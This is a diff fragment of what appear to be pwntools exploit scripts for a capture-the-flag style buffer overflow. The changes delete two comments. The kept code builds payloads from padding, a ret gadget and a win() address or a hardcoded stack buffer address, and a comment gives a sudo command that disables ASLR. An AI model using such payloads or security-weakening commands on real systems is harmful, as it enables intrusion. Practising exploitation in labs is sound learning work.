@@ -209,7 +209,6 @@ ret_gadget = 0x401016
 log.info(f&quot;win() entry point @ {hex(win_addr)}&quot;)
 log.info(f&quot;Stack alignment ret @ {hex(ret_gadget)}&quot;)
 
-# Build payload exactly like your successful terminal exploit
 payload = b&#x27;A&#x27; * offset + p64(ret_gadget) + p64(win_addr)
 
 # Read clean up to the prompt, send payload, then push an explicit newline
@@ -275,7 +274,6 @@ offset = 136
 # With no PIE and no ASLR (or after leaking), we get it from /proc or gdb.
 # For ASLR disabled: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 #
-# In gdb: p &amp;buf -&gt; 0x7fffffffe3a0  (example)
 buf_addr = 0x7fffffffe3a0  # replace with your value from gdb
 
 payload = flat(
